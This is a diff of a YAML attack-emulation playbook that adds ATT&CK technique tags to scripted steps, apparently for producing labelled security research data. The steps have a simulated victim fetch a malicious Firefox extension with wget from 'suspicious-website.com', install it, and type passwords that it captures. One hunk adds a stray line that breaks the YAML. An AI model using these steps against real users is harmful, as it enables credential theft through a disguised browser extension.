@@ -33,6 +33,10 @@ commands:
     local_path: /home/aecid/firefox-extension/extension.xpi
     port: 8082
     background: True
+    metadata:
+      techniques: "T1176,T1056.001,T1056.004,T1115"
+      tactics: "Persistence"
+      technique_name: "Browser Extensions,Input Capture: Keylogging,Input Capture: Credential API Hooking,Clipboard Data"
 
 ##################### SOCIAL ENGINEERING ON CLIENT ############################
 
@@ -99,6 +103,10 @@ commands:
     cmd: type
     input: "wget -O  /home/judy/extension.xpi suspicious-website.com:8082/index"
     session: social_engineering
+    metadata:
+      techniques: "T1176,T1056.001,T1056.004,T1115"
+      tactics: "Persistence"
+      technique_name: "Browser Extensions,Input Capture: Keylogging,Input Capture: Credential API Hooking,Clipboard Data"
 
   - type: sleep
     seconds: 3
@@ -107,6 +115,10 @@ commands:
     cmd: key
     key: "enter"
     session: social_engineering
+    metadata:
+      techniques: "T1176,T1056.001,T1056.004,T1115"
+      tactics: "Persistence"
+      technique_name: "Browser Extensions,Input Capture: Keylogging,Input Capture: Credential API Hooking,Clipboard Data"
 
   - type: sleep
     seconds: 20
@@ -117,6 +129,10 @@ commands:
     cmd: type 
     input: "xdg-settings set default-web-browser firefox.desktop && firefox extension.xpi"
     session: social_engineering
+    metadata:
+      techniques: "T1176,T1056.001,T1056.004,T1115"
+      tactics: "Persistence"
+      technique_name: "Browser Extensions,Input Capture: Keylogging,Input Capture: Credential API Hooking,Clipboard Data"
 
   - type: sleep
     seconds: 3
@@ -125,6 +141,10 @@ commands:
     cmd: key
     key: "enter"
     session: social_engineering
+    metadata:
+      techniques: "T1176,T1056.001,T1056.004,T1115"
+      tactics: "Persistence"
+      technique_name: "Browser Extensions,Input Capture: Keylogging,Input Capture: Credential API Hooking,Clipboard Data"
 
   - type: sleep
     seconds: 60
@@ -137,6 +157,10 @@ commands:
     x: 930
     y: 653
     session: social_engineering
+    metadata:
+      techniques: "T1176,T1056.001,T1056.004,T1115"
+      tactics: "Persistence"
+      technique_name: "Browser Extensions,Input Capture: Keylogging,Input Capture: Credential API Hooking,Clipboard Data"
 
   - type: sleep
     seconds: 2
@@ -144,6 +168,10 @@ commands:
   - type: vnc
     cmd: click
     session: social_engineering
+    metadata:
+      techniques: "T1176,T1056.001,T1056.004,T1115"
+      tactics: "Persistence"
+      technique_name: "Browser Extensions,Input Capture: Keylogging,Input Capture: Credential API Hooking,Clipboard Data"
 
   - type: sleep
     seconds: 2
@@ -171,6 +199,10 @@ commands:
     cmd: type 
     input: "172.17.10"
     session: social_engineering
+    metadata:
+      techniques: "T1056.001"
+      tactics: "Collection"
+      technique_name: "Input Capture: Keylogging"
 
   - type: sleep
     seconds: 1
@@ -179,6 +211,11 @@ commands:
     cmd: type 
     input: "0.121:80/zm"
     session: social_engineering
+    metadata:
+      techniques: "T1056.001"
+      tactics: "Collection"
+      technique_name: "Input Capture: Keylogging"
+
   - type: sleep
     seconds: 2
 
@@ -198,6 +235,12 @@ commands:
     cmd: type 
     input: "StarryEcho42BlazeTrix"
     session: social_engineering
+    metadata:
+      techniques: "T1115,T1056.004,T1056.001 "
+      tactics: "Collection, Credential Access"
+      technique_name: "Input Capture: Credential API Hooking,Input Capture: Keylogging"
+
+    Input Capture: Credential API Hooking
 
   - type: sleep
     seconds: 2
@@ -213,6 +256,10 @@ commands:
     cmd: type 
     input: "TwilightV3n0mR3alm9QzX"
     session: social_engineering
+    metadata:
+      techniques: "T1115,T1056.004,T1056.001"
+      tactics: "Collection, Credential Access"
+      technique_name: "Input Capture: Credential API Hooking,Input Capture: Keylogging"
 
   - type: sleep
     seconds: 2
@@ -231,6 +278,10 @@ commands:
     cmd: key
     key: "enter"
     session: social_engineering
+    metadata:
+      techniques: "T1115,T1056.004"
+      tactics: "Collection, Credential Access"
+      technique_name: "Input Capture: Credential API Hooking"
 
   - type: sleep
     seconds: 5
@@ -261,6 +312,10 @@ commands:
     x: 565
     y: 245
     session: social_engineering
+    metadata:
+      techniques: "T1115"
+      tactics: "Collection"
+      technique_name: "Clipboard Data"
 
   - type: sleep
     seconds: 2
@@ -268,6 +323,10 @@ commands:
   - type: vnc
     cmd: click
     session: social_engineering
+    metadata:
+      techniques: "T1115"
+      tactics: "Collection"
+      technique_name: "Clipboard Data"
 
   - type: sleep
     seconds: 3
